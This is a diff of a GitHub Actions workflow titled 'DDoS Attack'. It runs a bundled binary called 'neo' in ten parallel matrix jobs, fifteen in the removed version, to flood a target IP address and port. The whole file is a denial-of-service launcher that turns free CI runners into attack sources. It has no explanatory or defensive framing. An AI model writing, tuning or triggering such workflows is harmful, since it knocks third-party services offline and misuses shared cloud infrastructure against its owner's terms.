@@ -1,13 +1,13 @@
-name: DDoS Attack
+name: DDoS Attack 8
 on: [push, workflow_dispatch]
 
 jobs:
-  attack:
-    runs-on: ubuntu-22.04
-    strategy:
-      matrix:
-        count: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15]
-    steps:
-    - uses: actions/checkout@v3
-    - run: chmod +x neo
-    - run: sudo ./neo 193.132.23 39482 10 999
+    attack:
+        runs-on: ubuntu-22.04
+        strategy:
+            matrix:
+                count: [1,2,3,4,5,6,7,8,9,10]
+        steps:
+        - uses: actions/checkout@v3
+        - run: chmod +x neo
+        - run: timeout 300 ./neo 1.1.1.3 603342 10 999
